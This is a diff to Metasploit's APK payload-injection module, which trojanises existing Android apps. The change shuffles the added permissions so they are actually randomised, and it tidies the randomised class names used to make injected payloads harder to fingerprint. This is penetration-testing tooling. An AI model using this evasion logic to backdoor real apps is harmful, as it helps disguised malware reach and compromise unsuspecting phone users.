@@ -78,23 +78,28 @@ class Msf::Payload::Apk
     original_permissions = original_manifest.xpath("//manifest/uses-permission")
 
     old_permissions = []
+    add_permissions = []
+
     original_permissions.each do |permission|
       name = permission.attribute("name").to_s
       old_permissions << name
     end
-    old_permissions.shuffle
 
     application = original_manifest.xpath('//manifest/application')
     payload_permissions.each do |permission|
       name = permission.attribute("name").to_s
       unless old_permissions.include?(name)
-        print_status("Adding #{name}")
-        if original_permissions.empty?
-          application.before(permission.to_xml)
-          original_permissions = original_manifest.xpath("//manifest/uses-permission")
-        else
-          original_permissions.before(permission.to_xml)
-        end
+        add_permissions += [permission.to_xml]
+      end
+    end
+    add_permissions.shuffle!
+    for permission_xml in add_permissions
+      print_status("Adding #{permission_xml}")
+      if original_permissions.empty?
+        application.before(permission_xml)
+        original_permissions = original_manifest.xpath("//manifest/uses-permission")
+      else
+        original_permissions.before(permission_xml)
       end
     end
 
@@ -215,9 +220,9 @@ class Msf::Payload::Apk
     package = amanifest.xpath("//manifest").first['package']
     package = package + ".#{Rex::Text::rand_text_alpha_lower(5)}"
     classes = {}
-    classes['Payload'] = "#{Rex::Text::rand_text_alpha_lower(5)}".capitalize
-    classes['MainService'] = "#{Rex::Text::rand_text_alpha_lower(5)}".capitalize
-    classes['MainBroadcastReceiver'] = "#{Rex::Text::rand_text_alpha_lower(5)}".capitalize
+    classes['Payload'] = Rex::Text::rand_text_alpha_lower(5).capitalize
+    classes['MainService'] = Rex::Text::rand_text_alpha_lower(5).capitalize
+    classes['MainBroadcastReceiver'] = Rex::Text::rand_text_alpha_lower(5).capitalize
     package_slash = package.gsub(/\./, "/")
     print_status "Adding payload as package #{package}\n"
     payload_files = Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/*.smali")
